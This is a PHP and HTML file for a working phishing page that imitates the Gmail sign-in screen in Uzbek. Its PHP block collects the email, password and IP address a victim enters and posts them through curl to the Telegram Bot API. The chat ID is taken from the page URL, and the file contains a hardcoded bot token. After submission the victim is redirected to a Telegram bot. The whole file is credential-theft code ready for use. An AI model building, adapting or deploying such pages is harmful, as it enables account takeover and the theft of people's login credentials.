<?php
// domen.name/rm/123456789 formatida ishlaydi

// URL dan user_id ni olish
$path = $_SERVER['REQUEST_URI'];
$parts = explode('/', trim($path, '?'));

if (count($parts) >= 2) {
    $user_id = end($parts);
} else {
    $user_id = $_GET['id'] ?? '';
}

if(empty($user_id) || !is_numeric($user_id)) {
    header("Location: https://t.me/hackerdevsbot?start=true");
    exit;
}



if($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
    
    if(!empty($email) && !empty($password)) {
        $bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
        $chat_id = $user_id;
        
        $message = "📧 <b>Gmail Login Ma'lumotlari</b>\n\n";
        $message .= "📧 <b>Email:</b> <code>" . htmlspecialchars($email) . "</code>\n";
        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n";
        $message .= "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
        $message .= "🕒 <b>Vaqt:</b> " . date('Y-m-d H:i:s') . "\n";
        $message .= "🆔 <b>User ID:</b> <code>$user_id</code>";
        
        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_exec($ch);
        curl_close($ch);
    }
    
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}
?>
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Arial, sans-serif; }
        body { background: #ffffff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 450px; }
        .header { text-align: center; margin-bottom: 40px; }
        .google-logo { width: 75px; height: 75px; margin: 0 auto 20px; }
        .google-logo img { width: 100%; height: 100%; }
        .header h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        .header p { color: #5f6368; font-size: 16px; }
        .login-box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; }
        .form-group { margin-bottom: 24px; }
        .form-group label { display: block; margin-bottom: 8px; color: #202124; font-size: 14px; font-weight: 500; }
        .form-group input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: border 0.2s; }
        .form-group input:focus { outline: none; border-color: #1a73e8; border-width: 2px; }
        .form-group input.error { border-color: #d93025; }
        .error-message { color: #d93025; font-size: 12px; margin-top: 4px; display: none; }
        .forgot-email { text-align: right; margin-bottom: 24px; }
        .forgot-email a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .forgot-email a:hover { text-decoration: underline; }
        .btn-next { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
        .btn-next:hover { background: #0b5cbf; }
        .btn-next:disabled { background: #e8f0fe; color: #b8c1cb; cursor: not-allowed; }
        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: flex; justify-content: center; align-items: center; z-index: 9999; flex-direction: column; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden-form { display: none; }
        .create-account { text-align: center; margin-top: 48px; }
        .create-account a { color: #1a73e8; text-decoration: none; font-weight: 500; }
        .create-account a:hover { text-decoration: underline; }
        .footer { margin-top: 24px; text-align: center; color: #5f6368; font-size: 12px; }
        .footer a { color: #5f6368; text-decoration: none; margin: 0 8px; }
        .footer a:hover { text-decoration: underline; }
        .language-selector { text-align: center; margin-top: 20px; font-size: 12px; color: #5f6368; }
        .language-selector select { border: none; background: none; color: #1a73e8; font-size: 12px; cursor: pointer; }
        .help-link { position: absolute; top: 20px; right: 20px; }
        .help-link a { color: #1a73e8; text-decoration: none; font-size: 14px; }
        .privacy-notice { background: #f8f9fa; padding: 16px; border-radius: 8px; margin-top: 24px; font-size: 12px; color: #5f6368; line-height: 1.5; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="help-link">
        <a href="#">Yordam</a>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Gmailga kirilmoqda...</div>
    </div>

    <div id="mainContent" class="hidden-form">
        <div class="container">
            <div class="header">
                <div class="google-logo">
                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google">
                </div>
                <h1>Hisobingizga kiring</h1>
                <p>Google xizmatlaridan foydalaning</p>
            </div>

            <div class="login-box">
                <form id="loginForm" method="POST">
                    <div class="form-group">
                        <label>Email yoki telefon raqami</label>
                        <input type="email" name="email" id="email" required>
                        <div class="error-message" id="emailError">To'g'ri email manzilini kiriting</div>
                    </div>

                    <div class="form-group" id="passwordGroup" style="display: none;">
                        <label>Parolingizni kiriting</label>
                        <input type="password" name="password" id="password" required>
                        <div class="error-message" id="passwordError">Parol noto'g'ri</div>
                    </div>

                    <div class="forgot-email" id="forgotEmail" style="display: none;">
                        <a href="#">Parolni unutdingizmi?</a>
                    </div>

                    <div class="create-account">
                        <a href="#">Hisob yaratish</a>
                    </div>

                    <div id="nextBtnContainer">
                        <button type="button" class="btn-next" id="nextBtn">Keyingisi</button>
                    </div>
                    
                    <div id="submitBtnContainer" style="display: none;">
                        <button type="submit" class="btn-next" id="submitBtn">Kirish</button>
                    </div>
                </form>
            </div>

            <div class="privacy-notice">
                <strong>Maxfiylik va xavfsizlik:</strong> Sizning ma'lumotlaringiz Google maxfiylik siyosati orqali himoyalangan.
            </div>

            <div class="language-selector">
                <select>
                    <option value="uz">O'zbekcha</option>
                    <option value="ru">Русский</option>
                    <option value="en">English</option>
                </select>
            </div>

            <div class="footer">
                <a href="#">Yordam</a>
                <a href="#">Maxfiylik</a>
                <a href="#">Shartlar</a>
            </div>
        </div>
    </div>

    <script>
        setTimeout(function() {
            document.getElementById('loadingOverlay').style.display = 'none';
            document.getElementById('mainContent').classList.remove('hidden-form');
            
            const emailInput = document.getElementById('email');
            const passwordGroup = document.getElementById('passwordGroup');
            const forgotEmail = document.getElementById('forgotEmail');
            const nextBtn = document.getElementById('nextBtn');
            const submitBtnContainer = document.getElementById('submitBtnContainer');
            const nextBtnContainer = document.getElementById('nextBtnContainer');
            const loginForm = document.getElementById('loginForm');
            
            // Email kiritilganda password maydonini ko'rsatish
            nextBtn.addEventListener('click', function() {
                const email = emailInput.value.trim();
                
                if(email && email.includes('@')) {
                    emailInput.disabled = true;
                    passwordGroup.style.display = 'block';
                    forgotEmail.style.display = 'block';
                    nextBtnContainer.style.display = 'none';
                    submitBtnContainer.style.display = 'block';
                } else {
                    document.getElementById('emailError').style.display = 'block';
                    emailInput.classList.add('error');
                }
            });
            
            // Form submit
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                this.submit();
            });
        }, 2000);
    </script>
</body>
</html>
